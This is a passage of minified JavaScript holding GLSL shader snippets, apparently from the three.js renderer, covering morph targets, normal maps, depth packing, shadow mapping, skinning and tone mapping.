	for ( int i = 0; i < MORPHTARGETS_COUNT; i ++ ) {
		#if defined( USE_COLOR_ALPHA )
			if ( morphTargetInfluences[ i ] != 0.0 ) vColor += getMorph( gl_VertexID, i, 2 ) * morphTargetInfluences[ i ];
		#elif defined( USE_COLOR )
			if ( morphTargetInfluences[ i ] != 0.0 ) vColor += getMorph( gl_VertexID, i, 2 ).rgb * morphTargetInfluences[ i ];
		#endif
	}
#endif`,_M=`#ifdef USE_MORPHNORMALS
	objectNormal *= morphTargetBaseInfluence;
	for ( int i = 0; i < MORPHTARGETS_COUNT; i ++ ) {
		if ( morphTargetInfluences[ i ] != 0.0 ) objectNormal += getMorph( gl_VertexID, i, 1 ).xyz * morphTargetInfluences[ i ];
	}
#endif`,xM=`#ifdef USE_MORPHTARGETS
	#ifndef USE_INSTANCING_MORPH
		uniform float morphTargetBaseInfluence;
		uniform float morphTargetInfluences[ MORPHTARGETS_COUNT ];
	#endif
	uniform sampler2DArray morphTargetsTexture;
	uniform ivec2 morphTargetsTextureSize;
	vec4 getMorph( const in int vertexIndex, const in int morphTargetIndex, const in int offset ) {
		int texelIndex = vertexIndex * MORPHTARGETS_TEXTURE_STRIDE + offset;
		int y = texelIndex / morphTargetsTextureSize.x;
		int x = texelIndex - y * morphTargetsTextureSize.x;
		ivec3 morphUV = ivec3( x, y, morphTargetIndex );
		return texelFetch( morphTargetsTexture, morphUV, 0 );
	}
#endif`,yM=`#ifdef USE_MORPHTARGETS
	transformed *= morphTargetBaseInfluence;
	for ( int i = 0; i < MORPHTARGETS_COUNT; i ++ ) {
		if ( morphTargetInfluences[ i ] != 0.0 ) transformed += getMorph( gl_VertexID, i, 0 ).xyz * morphTargetInfluences[ i ];
	}
#endif`,SM=`float faceDirection = gl_FrontFacing ? 1.0 : - 1.0;
#ifdef FLAT_SHADED
	vec3 fdx = dFdx( vViewPosition );
	vec3 fdy = dFdy( vViewPosition );
	vec3 normal = normalize( cross( fdx, fdy ) );
#else
	vec3 normal = normalize( vNormal );
	#ifdef DOUBLE_SIDED
		normal *= faceDirection;
	#endif
#endif
#if defined( USE_NORMALMAP_TANGENTSPACE ) || defined( USE_CLEARCOAT_NORMALMAP ) || defined( USE_ANISOTROPY )
	#ifdef USE_TANGENT
		mat3 tbn = mat3( normalize( vTangent ), normalize( vBitangent ), normal );
	#else
		mat3 tbn = getTangentFrame( - vViewPosition, normal,
		#if defined( USE_NORMALMAP )
			vNormalMapUv
		#elif defined( USE_CLEARCOAT_NORMALMAP )
			vClearcoatNormalMapUv
		#else
			vUv
		#endif
		);
	#endif
	#if defined( DOUBLE_SIDED ) && ! defined( FLAT_SHADED )
		tbn[0] *= faceDirection;
		tbn[1] *= faceDirection;
	#endif
#endif
#ifdef USE_CLEARCOAT_NORMALMAP
	#ifdef USE_TANGENT
		mat3 tbn2 = mat3( normalize( vTangent ), normalize( vBitangent ), normal );
	#else
		mat3 tbn2 = getTangentFrame( - vViewPosition, normal, vClearcoatNormalMapUv );
	#endif
	#if defined( DOUBLE_SIDED ) && ! defined( FLAT_SHADED )
		tbn2[0] *= faceDirection;
		tbn2[1] *= faceDirection;
	#endif
#endif
vec3 nonPerturbedNormal = normal;`,bM=`#ifdef USE_NORMALMAP_OBJECTSPACE
	normal = texture2D( normalMap, vNormalMapUv ).xyz * 2.0 - 1.0;
	#ifdef FLIP_SIDED
		normal = - normal;
	#endif
	#ifdef DOUBLE_SIDED
		normal = normal * faceDirection;
	#endif
	normal = normalize( normalMatrix * normal );
#elif defined( USE_NORMALMAP_TANGENTSPACE )
	vec3 mapN = texture2D( normalMap, vNormalMapUv ).xyz * 2.0 - 1.0;
	mapN.xy *= normalScale;
	normal = normalize( tbn * mapN );
#elif defined( USE_BUMPMAP )
	normal = perturbNormalArb( - vViewPosition, normal, dHdxy_fwd(), faceDirection );
#endif`,wM=`#ifndef FLAT_SHADED
	varying vec3 vNormal;
	#ifdef USE_TANGENT
		varying vec3 vTangent;
		varying vec3 vBitangent;
	#endif
#endif`,EM=`#ifndef FLAT_SHADED
	varying vec3 vNormal;
	#ifdef USE_TANGENT
		varying vec3 vTangent;
		varying vec3 vBitangent;
	#endif
#endif`,MM=`#ifndef FLAT_SHADED
	vNormal = normalize( transformedNormal );
	#ifdef USE_TANGENT
		vTangent = normalize( transformedTangent );
		vBitangent = normalize( cross( vNormal, vTangent ) * tangent.w );
	#endif
#endif`,TM=`#ifdef USE_NORMALMAP
	uniform sampler2D normalMap;
	uniform vec2 normalScale;
#endif
#ifdef USE_NORMALMAP_OBJECTSPACE
	uniform mat3 normalMatrix;
#endif
#if ! defined ( USE_TANGENT ) && ( defined ( USE_NORMALMAP_TANGENTSPACE ) || defined ( USE_CLEARCOAT_NORMALMAP ) || defined( USE_ANISOTROPY ) )
	mat3 getTangentFrame( vec3 eye_pos, vec3 surf_norm, vec2 uv ) {
		vec3 q0 = dFdx( eye_pos.xyz );
		vec3 q1 = dFdy( eye_pos.xyz );
		vec2 st0 = dFdx( uv.st );
		vec2 st1 = dFdy( uv.st );
		vec3 N = surf_norm;
		vec3 q1perp = cross( q1, N );
		vec3 q0perp = cross( N, q0 );
		vec3 T = q1perp * st0.x + q0perp * st1.x;
		vec3 B = q1perp * st0.y + q0perp * st1.y;
		float det = max( dot( T, T ), dot( B, B ) );
		float scale = ( det == 0.0 ) ? 0.0 : inversesqrt( det );
		return mat3( T * scale, B * scale, N );
	}
#endif`,AM=`#ifdef USE_CLEARCOAT
	vec3 clearcoatNormal = nonPerturbedNormal;
#endif`,CM=`#ifdef USE_CLEARCOAT_NORMALMAP
	vec3 clearcoatMapN = texture2D( clearcoatNormalMap, vClearcoatNormalMapUv ).xyz * 2.0 - 1.0;
	clearcoatMapN.xy *= clearcoatNormalScale;
	clearcoatNormal = normalize( tbn2 * clearcoatMapN );
#endif`,RM=`#ifdef USE_CLEARCOATMAP
	uniform sampler2D clearcoatMap;
#endif
#ifdef USE_CLEARCOAT_NORMALMAP
	uniform sampler2D clearcoatNormalMap;
	uniform vec2 clearcoatNormalScale;
#endif
#ifdef USE_CLEARCOAT_ROUGHNESSMAP
	uniform sampler2D clearcoatRoughnessMap;
#endif`,PM=`#ifdef USE_IRIDESCENCEMAP
	uniform sampler2D iridescenceMap;
#endif
#ifdef USE_IRIDESCENCE_THICKNESSMAP
	uniform sampler2D iridescenceThicknessMap;
#endif`,kM=`#ifdef OPAQUE
diffuseColor.a = 1.0;
#endif
#ifdef USE_TRANSMISSION
diffuseColor.a *= material.transmissionAlpha;
#endif
gl_FragColor = vec4( outgoingLight, diffuseColor.a );`,LM=`vec3 packNormalToRGB( const in vec3 normal ) {
	return normalize( normal ) * 0.5 + 0.5;
}
vec3 unpackRGBToNormal( const in vec3 rgb ) {
	return 2.0 * rgb.xyz - 1.0;
}
const float PackUpscale = 256. / 255.;const float UnpackDownscale = 255. / 256.;const float ShiftRight8 = 1. / 256.;
const float Inv255 = 1. / 255.;
const vec4 PackFactors = vec4( 1.0, 256.0, 256.0 * 256.0, 256.0 * 256.0 * 256.0 );
const vec2 UnpackFactors2 = vec2( UnpackDownscale, 1.0 / PackFactors.g );
const vec3 UnpackFactors3 = vec3( UnpackDownscale / PackFactors.rg, 1.0 / PackFactors.b );
const vec4 UnpackFactors4 = vec4( UnpackDownscale / PackFactors.rgb, 1.0 / PackFactors.a );
vec4 packDepthToRGBA( const in float v ) {
	if( v <= 0.0 )
		return vec4( 0., 0., 0., 0. );
	if( v >= 1.0 )
		return vec4( 1., 1., 1., 1. );
	float vuf;
	float af = modf( v * PackFactors.a, vuf );
	float bf = modf( vuf * ShiftRight8, vuf );
	float gf = modf( vuf * ShiftRight8, vuf );
	return vec4( vuf * Inv255, gf * PackUpscale, bf * PackUpscale, af );
}
vec3 packDepthToRGB( const in float v ) {
	if( v <= 0.0 )
		return vec3( 0., 0., 0. );
	if( v >= 1.0 )
		return vec3( 1., 1., 1. );
	float vuf;
	float bf = modf( v * PackFactors.b, vuf );
	float gf = modf( vuf * ShiftRight8, vuf );
	return vec3( vuf * Inv255, gf * PackUpscale, bf );
}
vec2 packDepthToRG( const in float v ) {
	if( v <= 0.0 )
		return vec2( 0., 0. );
	if( v >= 1.0 )
		return vec2( 1., 1. );
	float vuf;
	float gf = modf( v * 256., vuf );
	return vec2( vuf * Inv255, gf );
}
float unpackRGBAToDepth( const in vec4 v ) {
	return dot( v, UnpackFactors4 );
}
float unpackRGBToDepth( const in vec3 v ) {
	return dot( v, UnpackFactors3 );
}
float unpackRGToDepth( const in vec2 v ) {
	return v.r * UnpackFactors2.r + v.g * UnpackFactors2.g;
}
vec4 pack2HalfToRGBA( const in vec2 v ) {
	vec4 r = vec4( v.x, fract( v.x * 255.0 ), v.y, fract( v.y * 255.0 ) );
	return vec4( r.x - r.y / 255.0, r.y, r.z - r.w / 255.0, r.w );
}
vec2 unpackRGBATo2Half( const in vec4 v ) {
	return vec2( v.x + ( v.y / 255.0 ), v.z + ( v.w / 255.0 ) );
}
float viewZToOrthographicDepth( const in float viewZ, const in float near, const in float far ) {
	return ( viewZ + near ) / ( near - far );
}
float orthographicDepthToViewZ( const in float depth, const in float near, const in float far ) {
	return depth * ( near - far ) - near;
}
float viewZToPerspectiveDepth( const in float viewZ, const in float near, const in float far ) {
	return ( ( near + viewZ ) * far ) / ( ( far - near ) * viewZ );
}
float perspectiveDepthToViewZ( const in float depth, const in float near, const in float far ) {
	return ( near * far ) / ( ( far - near ) * depth - far );
}`,NM=`#ifdef PREMULTIPLIED_ALPHA
	gl_FragColor.rgb *= gl_FragColor.a;
#endif`,IM=`vec4 mvPosition = vec4( transformed, 1.0 );
#ifdef USE_BATCHING
	mvPosition = batchingMatrix * mvPosition;
#endif
#ifdef USE_INSTANCING
	mvPosition = instanceMatrix * mvPosition;
#endif
mvPosition = modelViewMatrix * mvPosition;
gl_Position = projectionMatrix * mvPosition;`,DM=`#ifdef DITHERING
	gl_FragColor.rgb = dithering( gl_FragColor.rgb );
#endif`,UM=`#ifdef DITHERING
	vec3 dithering( vec3 color ) {
		float grid_position = rand( gl_FragCoord.xy );
		vec3 dither_shift_RGB = vec3( 0.25 / 255.0, -0.25 / 255.0, 0.25 / 255.0 );
		dither_shift_RGB = mix( 2.0 * dither_shift_RGB, -2.0 * dither_shift_RGB, grid_position );
		return color + dither_shift_RGB;
	}
#endif`,OM=`float roughnessFactor = roughness;
#ifdef USE_ROUGHNESSMAP
	vec4 texelRoughness = texture2D( roughnessMap, vRoughnessMapUv );
	roughnessFactor *= texelRoughness.g;
#endif`,FM=`#ifdef USE_ROUGHNESSMAP
	uniform sampler2D roughnessMap;
#endif`,BM=`#if NUM_SPOT_LIGHT_COORDS > 0
	varying vec4 vSpotLightCoord[ NUM_SPOT_LIGHT_COORDS ];
#endif
#if NUM_SPOT_LIGHT_MAPS > 0
	uniform sampler2D spotLightMap[ NUM_SPOT_LIGHT_MAPS ];
#endif
#ifdef USE_SHADOWMAP
	#if NUM_DIR_LIGHT_SHADOWS > 0
		#if defined( SHADOWMAP_TYPE_PCF )
			uniform sampler2DShadow directionalShadowMap[ NUM_DIR_LIGHT_SHADOWS ];
		#else
			uniform sampler2D directionalShadowMap[ NUM_DIR_LIGHT_SHADOWS ];
		#endif
		varying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHT_SHADOWS ];
		struct DirectionalLightShadow {
			float shadowIntensity;
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
		};
		uniform DirectionalLightShadow directionalLightShadows[ NUM_DIR_LIGHT_SHADOWS ];
	#endif
	#if NUM_SPOT_LIGHT_SHADOWS > 0
		#if defined( SHADOWMAP_TYPE_PCF )
			uniform sampler2DShadow spotShadowMap[ NUM_SPOT_LIGHT_SHADOWS ];
		#else
			uniform sampler2D spotShadowMap[ NUM_SPOT_LIGHT_SHADOWS ];
		#endif
		struct SpotLightShadow {
			float shadowIntensity;
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
		};
		uniform SpotLightShadow spotLightShadows[ NUM_SPOT_LIGHT_SHADOWS ];
	#endif
	#if NUM_POINT_LIGHT_SHADOWS > 0
		#if defined( SHADOWMAP_TYPE_PCF )
			uniform samplerCubeShadow pointShadowMap[ NUM_POINT_LIGHT_SHADOWS ];
		#elif defined( SHADOWMAP_TYPE_BASIC )
			uniform samplerCube pointShadowMap[ NUM_POINT_LIGHT_SHADOWS ];
		#endif
		varying vec4 vPointShadowCoord[ NUM_POINT_LIGHT_SHADOWS ];
		struct PointLightShadow {
			float shadowIntensity;
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
			float shadowCameraNear;
			float shadowCameraFar;
		};
		uniform PointLightShadow pointLightShadows[ NUM_POINT_LIGHT_SHADOWS ];
	#endif
	#if defined( SHADOWMAP_TYPE_PCF )
		float interleavedGradientNoise( vec2 position ) {
			return fract( 52.9829189 * fract( dot( position, vec2( 0.06711056, 0.00583715 ) ) ) );
		}
		vec2 vogelDiskSample( int sampleIndex, int samplesCount, float phi ) {
			const float goldenAngle = 2.399963229728653;
			float r = sqrt( ( float( sampleIndex ) + 0.5 ) / float( samplesCount ) );
			float theta = float( sampleIndex ) * goldenAngle + phi;
			return vec2( cos( theta ), sin( theta ) ) * r;
		}
	#endif
	#if defined( SHADOWMAP_TYPE_PCF )
		float getShadow( sampler2DShadow shadowMap, vec2 shadowMapSize, float shadowIntensity, float shadowBias, float shadowRadius, vec4 shadowCoord ) {
			float shadow = 1.0;
			shadowCoord.xyz /= shadowCoord.w;
			shadowCoord.z += shadowBias;
			bool inFrustum = shadowCoord.x >= 0.0 && shadowCoord.x <= 1.0 && shadowCoord.y >= 0.0 && shadowCoord.y <= 1.0;
			bool frustumTest = inFrustum && shadowCoord.z <= 1.0;
			if ( frustumTest ) {
				vec2 texelSize = vec2( 1.0 ) / shadowMapSize;
				float radius = shadowRadius * texelSize.x;
				float phi = interleavedGradientNoise( gl_FragCoord.xy ) * 6.28318530718;
				shadow = (
					texture( shadowMap, vec3( shadowCoord.xy + vogelDiskSample( 0, 5, phi ) * radius, shadowCoord.z ) ) +
					texture( shadowMap, vec3( shadowCoord.xy + vogelDiskSample( 1, 5, phi ) * radius, shadowCoord.z ) ) +
					texture( shadowMap, vec3( shadowCoord.xy + vogelDiskSample( 2, 5, phi ) * radius, shadowCoord.z ) ) +
					texture( shadowMap, vec3( shadowCoord.xy + vogelDiskSample( 3, 5, phi ) * radius, shadowCoord.z ) ) +
					texture( shadowMap, vec3( shadowCoord.xy + vogelDiskSample( 4, 5, phi ) * radius, shadowCoord.z ) )
				) * 0.2;
			}
			return mix( 1.0, shadow, shadowIntensity );
		}
	#elif defined( SHADOWMAP_TYPE_VSM )
		float getShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowIntensity, float shadowBias, float shadowRadius, vec4 shadowCoord ) {
			float shadow = 1.0;
			shadowCoord.xyz /= shadowCoord.w;
			shadowCoord.z += shadowBias;
			bool inFrustum = shadowCoord.x >= 0.0 && shadowCoord.x <= 1.0 && shadowCoord.y >= 0.0 && shadowCoord.y <= 1.0;
			bool frustumTest = inFrustum && shadowCoord.z <= 1.0;
			if ( frustumTest ) {
				vec2 distribution = texture2D( shadowMap, shadowCoord.xy ).rg;
				float mean = distribution.x;
				float variance = distribution.y * distribution.y;
				#ifdef USE_REVERSED_DEPTH_BUFFER
					float hard_shadow = step( mean, shadowCoord.z );
				#else
					float hard_shadow = step( shadowCoord.z, mean );
				#endif
				if ( hard_shadow == 1.0 ) {
					shadow = 1.0;
				} else {
					variance = max( variance, 0.0000001 );
					float d = shadowCoord.z - mean;
					float p_max = variance / ( variance + d * d );
					p_max = clamp( ( p_max - 0.3 ) / 0.65, 0.0, 1.0 );
					shadow = max( hard_shadow, p_max );
				}
			}
			return mix( 1.0, shadow, shadowIntensity );
		}
	#else
		float getShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowIntensity, float shadowBias, float shadowRadius, vec4 shadowCoord ) {
			float shadow = 1.0;
			shadowCoord.xyz /= shadowCoord.w;
			shadowCoord.z += shadowBias;
			bool inFrustum = shadowCoord.x >= 0.0 && shadowCoord.x <= 1.0 && shadowCoord.y >= 0.0 && shadowCoord.y <= 1.0;
			bool frustumTest = inFrustum && shadowCoord.z <= 1.0;
			if ( frustumTest ) {
				float depth = texture2D( shadowMap, shadowCoord.xy ).r;
				#ifdef USE_REVERSED_DEPTH_BUFFER
					shadow = step( depth, shadowCoord.z );
				#else
					shadow = step( shadowCoord.z, depth );
				#endif
			}
			return mix( 1.0, shadow, shadowIntensity );
		}
	#endif
	#if NUM_POINT_LIGHT_SHADOWS > 0
	#if defined( SHADOWMAP_TYPE_PCF )
	float getPointShadow( samplerCubeShadow shadowMap, vec2 shadowMapSize, float shadowIntensity, float shadowBias, float shadowRadius, vec4 shadowCoord, float shadowCameraNear, float shadowCameraFar ) {
		float shadow = 1.0;
		vec3 lightToPosition = shadowCoord.xyz;
		vec3 bd3D = normalize( lightToPosition );
		vec3 absVec = abs( lightToPosition );
		float viewSpaceZ = max( max( absVec.x, absVec.y ), absVec.z );
		if ( viewSpaceZ - shadowCameraFar <= 0.0 && viewSpaceZ - shadowCameraNear >= 0.0 ) {
			float dp = ( shadowCameraFar * ( viewSpaceZ - shadowCameraNear ) ) / ( viewSpaceZ * ( shadowCameraFar - shadowCameraNear ) );
			dp += shadowBias;
			float texelSize = shadowRadius / shadowMapSize.x;
			vec3 absDir = abs( bd3D );
			vec3 tangent = absDir.x > absDir.z ? vec3( 0.0, 1.0, 0.0 ) : vec3( 1.0, 0.0, 0.0 );
			tangent = normalize( cross( bd3D, tangent ) );
			vec3 bitangent = cross( bd3D, tangent );
			float phi = interleavedGradientNoise( gl_FragCoord.xy ) * 6.28318530718;
			shadow = (
				texture( shadowMap, vec4( bd3D + ( tangent * vogelDiskSample( 0, 5, phi ).x + bitangent * vogelDiskSample( 0, 5, phi ).y ) * texelSize, dp ) ) +
				texture( shadowMap, vec4( bd3D + ( tangent * vogelDiskSample( 1, 5, phi ).x + bitangent * vogelDiskSample( 1, 5, phi ).y ) * texelSize, dp ) ) +
				texture( shadowMap, vec4( bd3D + ( tangent * vogelDiskSample( 2, 5, phi ).x + bitangent * vogelDiskSample( 2, 5, phi ).y ) * texelSize, dp ) ) +
				texture( shadowMap, vec4( bd3D + ( tangent * vogelDiskSample( 3, 5, phi ).x + bitangent * vogelDiskSample( 3, 5, phi ).y ) * texelSize, dp ) ) +
				texture( shadowMap, vec4( bd3D + ( tangent * vogelDiskSample( 4, 5, phi ).x + bitangent * vogelDiskSample( 4, 5, phi ).y ) * texelSize, dp ) )
			) * 0.2;
		}
		return mix( 1.0, shadow, shadowIntensity );
	}
	#elif defined( SHADOWMAP_TYPE_BASIC )
	float getPointShadow( samplerCube shadowMap, vec2 shadowMapSize, float shadowIntensity, float shadowBias, float shadowRadius, vec4 shadowCoord, float shadowCameraNear, float shadowCameraFar ) {
		float shadow = 1.0;
		vec3 lightToPosition = shadowCoord.xyz;
		vec3 bd3D = normalize( lightToPosition );
		vec3 absVec = abs( lightToPosition );
		float viewSpaceZ = max( max( absVec.x, absVec.y ), absVec.z );
		if ( viewSpaceZ - shadowCameraFar <= 0.0 && viewSpaceZ - shadowCameraNear >= 0.0 ) {
			float dp = ( shadowCameraFar * ( viewSpaceZ - shadowCameraNear ) ) / ( viewSpaceZ * ( shadowCameraFar - shadowCameraNear ) );
			dp += shadowBias;
			float depth = textureCube( shadowMap, bd3D ).r;
			#ifdef USE_REVERSED_DEPTH_BUFFER
				shadow = step( depth, dp );
			#else
				shadow = step( dp, depth );
			#endif
		}
		return mix( 1.0, shadow, shadowIntensity );
	}
	#endif
	#endif
#endif`,zM=`#if NUM_SPOT_LIGHT_COORDS > 0
	uniform mat4 spotLightMatrix[ NUM_SPOT_LIGHT_COORDS ];
	varying vec4 vSpotLightCoord[ NUM_SPOT_LIGHT_COORDS ];
#endif
#ifdef USE_SHADOWMAP
	#if NUM_DIR_LIGHT_SHADOWS > 0
		uniform mat4 directionalShadowMatrix[ NUM_DIR_LIGHT_SHADOWS ];
		varying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHT_SHADOWS ];
		struct DirectionalLightShadow {
			float shadowIntensity;
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
		};
		uniform DirectionalLightShadow directionalLightShadows[ NUM_DIR_LIGHT_SHADOWS ];
	#endif
	#if NUM_SPOT_LIGHT_SHADOWS > 0
		struct SpotLightShadow {
			float shadowIntensity;
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
		};
		uniform SpotLightShadow spotLightShadows[ NUM_SPOT_LIGHT_SHADOWS ];
	#endif
	#if NUM_POINT_LIGHT_SHADOWS > 0
		uniform mat4 pointShadowMatrix[ NUM_POINT_LIGHT_SHADOWS ];
		varying vec4 vPointShadowCoord[ NUM_POINT_LIGHT_SHADOWS ];
		struct PointLightShadow {
			float shadowIntensity;
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
			float shadowCameraNear;
			float shadowCameraFar;
		};
		uniform PointLightShadow pointLightShadows[ NUM_POINT_LIGHT_SHADOWS ];
	#endif
#endif`,VM=`#if ( defined( USE_SHADOWMAP ) && ( NUM_DIR_LIGHT_SHADOWS > 0 || NUM_POINT_LIGHT_SHADOWS > 0 ) ) || ( NUM_SPOT_LIGHT_COORDS > 0 )
	vec3 shadowWorldNormal = inverseTransformDirection( transformedNormal, viewMatrix );
	vec4 shadowWorldPosition;
#endif
#if defined( USE_SHADOWMAP )
	#if NUM_DIR_LIGHT_SHADOWS > 0
		#pragma unroll_loop_start
		for ( int i = 0; i < NUM_DIR_LIGHT_SHADOWS; i ++ ) {
			shadowWorldPosition = worldPosition + vec4( shadowWorldNormal * directionalLightShadows[ i ].shadowNormalBias, 0 );
			vDirectionalShadowCoord[ i ] = directionalShadowMatrix[ i ] * shadowWorldPosition;
		}
		#pragma unroll_loop_end
	#endif
	#if NUM_POINT_LIGHT_SHADOWS > 0
		#pragma unroll_loop_start
		for ( int i = 0; i < NUM_POINT_LIGHT_SHADOWS; i ++ ) {
			shadowWorldPosition = worldPosition + vec4( shadowWorldNormal * pointLightShadows[ i ].shadowNormalBias, 0 );
			vPointShadowCoord[ i ] = pointShadowMatrix[ i ] * shadowWorldPosition;
		}
		#pragma unroll_loop_end
	#endif
#endif
#if NUM_SPOT_LIGHT_COORDS > 0
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_SPOT_LIGHT_COORDS; i ++ ) {
		shadowWorldPosition = worldPosition;
		#if ( defined( USE_SHADOWMAP ) && UNROLLED_LOOP_INDEX < NUM_SPOT_LIGHT_SHADOWS )
			shadowWorldPosition.xyz += shadowWorldNormal * spotLightShadows[ i ].shadowNormalBias;
		#endif
		vSpotLightCoord[ i ] = spotLightMatrix[ i ] * shadowWorldPosition;
	}
	#pragma unroll_loop_end
#endif`,HM=`float getShadowMask() {
	float shadow = 1.0;
	#ifdef USE_SHADOWMAP
	#if NUM_DIR_LIGHT_SHADOWS > 0
	DirectionalLightShadow directionalLight;
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_DIR_LIGHT_SHADOWS; i ++ ) {
		directionalLight = directionalLightShadows[ i ];
		shadow *= receiveShadow ? getShadow( directionalShadowMap[ i ], directionalLight.shadowMapSize, directionalLight.shadowIntensity, directionalLight.shadowBias, directionalLight.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;
	}
	#pragma unroll_loop_end
	#endif
	#if NUM_SPOT_LIGHT_SHADOWS > 0
	SpotLightShadow spotLight;
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_SPOT_LIGHT_SHADOWS; i ++ ) {
		spotLight = spotLightShadows[ i ];
		shadow *= receiveShadow ? getShadow( spotShadowMap[ i ], spotLight.shadowMapSize, spotLight.shadowIntensity, spotLight.shadowBias, spotLight.shadowRadius, vSpotLightCoord[ i ] ) : 1.0;
	}
	#pragma unroll_loop_end
	#endif
	#if NUM_POINT_LIGHT_SHADOWS > 0 && ( defined( SHADOWMAP_TYPE_PCF ) || defined( SHADOWMAP_TYPE_BASIC ) )
	PointLightShadow pointLight;
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_POINT_LIGHT_SHADOWS; i ++ ) {
		pointLight = pointLightShadows[ i ];
		shadow *= receiveShadow ? getPointShadow( pointShadowMap[ i ], pointLight.shadowMapSize, pointLight.shadowIntensity, pointLight.shadowBias, pointLight.shadowRadius, vPointShadowCoord[ i ], pointLight.shadowCameraNear, pointLight.shadowCameraFar ) : 1.0;
	}
	#pragma unroll_loop_end
	#endif
	#endif
	return shadow;
}`,GM=`#ifdef USE_SKINNING
	mat4 boneMatX = getBoneMatrix( skinIndex.x );
	mat4 boneMatY = getBoneMatrix( skinIndex.y );
	mat4 boneMatZ = getBoneMatrix( skinIndex.z );
	mat4 boneMatW = getBoneMatrix( skinIndex.w );
#endif`,WM=`#ifdef USE_SKINNING
	uniform mat4 bindMatrix;
	uniform mat4 bindMatrixInverse;
	uniform highp sampler2D boneTexture;
	mat4 getBoneMatrix( const in float i ) {
		int size = textureSize( boneTexture, 0 ).x;
		int j = int( i ) * 4;
		int x = j % size;
		int y = j / size;
		vec4 v1 = texelFetch( boneTexture, ivec2( x, y ), 0 );
		vec4 v2 = texelFetch( boneTexture, ivec2( x + 1, y ), 0 );
		vec4 v3 = texelFetch( boneTexture, ivec2( x + 2, y ), 0 );
		vec4 v4 = texelFetch( boneTexture, ivec2( x + 3, y ), 0 );
		return mat4( v1, v2, v3, v4 );
	}
#endif`,jM=`#ifdef USE_SKINNING
	vec4 skinVertex = bindMatrix * vec4( transformed, 1.0 );
	vec4 skinned = vec4( 0.0 );
	skinned += boneMatX * skinVertex * skinWeight.x;
	skinned += boneMatY * skinVertex * skinWeight.y;
	skinned += boneMatZ * skinVertex * skinWeight.z;
	skinned += boneMatW * skinVertex * skinWeight.w;
	transformed = ( bindMatrixInverse * skinned ).xyz;
#endif`,XM=`#ifdef USE_SKINNING
	mat4 skinMatrix = mat4( 0.0 );
	skinMatrix += skinWeight.x * boneMatX;
	skinMatrix += skinWeight.y * boneMatY;
	skinMatrix += skinWeight.z * boneMatZ;
	skinMatrix += skinWeight.w * boneMatW;
	skinMatrix = bindMatrixInverse * skinMatrix * bindMatrix;
	objectNormal = vec4( skinMatrix * vec4( objectNormal, 0.0 ) ).xyz;
	#ifdef USE_TANGENT
		objectTangent = vec4( skinMatrix * vec4( objectTangent, 0.0 ) ).xyz;
	#endif
#endif`,qM=`float specularStrength;
#ifdef USE_SPECULARMAP
	vec4 texelSpecular = texture2D( specularMap, vSpecularMapUv );
	specularStrength = texelSpecular.r;
#else
	specularStrength = 1.0;
#endif`,YM=`#ifdef USE_SPECULARMAP
	uniform sampler2D specularMap;
#endif`,$M=`#if defined( TONE_MAPPING )
	gl_FragColor.rgb = toneMapping( gl_FragColor.rgb );
#endif`,KM=`#ifndef saturate
#define saturate( a ) clamp( a, 0.0, 1.0 )
#endif
uniform float toneMappingExposure;
vec3 LinearToneMapping( vec3 color ) {
	return saturate( toneMappingExposure * color );
}
vec3 ReinhardToneMapping( vec3 color ) {
	color *= toneMappingExposure;
	return saturate( color / ( vec3( 1.0 ) + color ) );
}
vec3 CineonToneMapping( vec3 color ) {
	color *= toneMappingExposure;
	color = max( vec3( 0.0 ), color - 0.004 );
	return pow( ( color * ( 6.2 * color + 0.5 ) ) / ( color * ( 6.2 * color + 1.7 ) + 0.06 ), vec3( 2.2 ) );
}
vec3 RRTAndODTFit( vec3 v ) {
	vec3 a = v * ( v + 0.0245786 ) - 0.000090537;
	vec3 b = v * ( 0.983729 * v + 0.4329510 ) + 0.238081;
	return a / b;
}
vec3 ACESFilmicToneMapping( vec3 color ) {
	const mat3 ACESInputMat = mat3(
		vec3( 0.59719, 0.07600, 0.02840 ),		vec3( 0.35458, 0.90834, 0.13383 ),
		vec3( 0.04823, 0.01566, 0.83777 )
	);
	const mat3 ACESOutputMat = mat3(
		vec3(  1.60475, -0.10208, -0.00327 ),		vec3( -0.53108,  1.10813, -0.07276 ),
		vec3( -0.07367, -0.00605,  1.07602 )
	);
	color *= toneMappingExposure / 0.6;
	color = ACESInputMat * color;
	color = RRTAndODTFit( color );
	color = ACESOutputMat * color;
	return saturate( color );
}
const mat3 LINEAR_REC2020_TO_LINEAR_SRGB = mat3(
	vec3( 1.6605, - 0.1246, - 0.0182 ),
	vec3( - 0.5876, 1.1329, - 0.1006 ),
	vec3( - 0.0728, - 0.0083, 1.1187 )
);
const mat3 LINEAR_SRGB_TO_LINEAR_REC2020 = mat3(
	vec3( 0.6274, 0.0691, 0.0164 ),
	vec3( 0.3293, 0.9195, 0.0880 ),
	vec3( 0.0433, 0.0113, 0.8956 )
);
vec3 agxDefaultContrastApprox( vec3 x ) {
	vec3 x2 = x * x;
	vec3 x4 = x2 * x2;
	return + 15.5 * x4 * x2
		- 40.14 * x4 * x
		+ 31.96 * x4
		- 6.868 * x2 * x
		+ 0.4298 * x2
		+ 0.1191 * x
		- 0.00232;
}
vec3 AgXToneMapping( vec3 color ) {
	const mat3 AgXInsetMatrix = mat3(
		vec3( 0.856627153315983, 0.137318972929847, 0.11189821299995 ),
		vec3( 0.0951212405381588, 0.761241990602591, 0.0767994186031903 ),
		vec3( 0.0482516061458583, 0.101439036467562, 0.811302368396859 )
	);
	const mat3 AgXOutsetMatrix = mat3(
		vec3( 1.1271005818144368, - 0.1413297634984383, - 0.14132976349843826 ),
		vec3( - 0.11060664309660323, 1.157823702216272, - 0.11060664309660294 ),
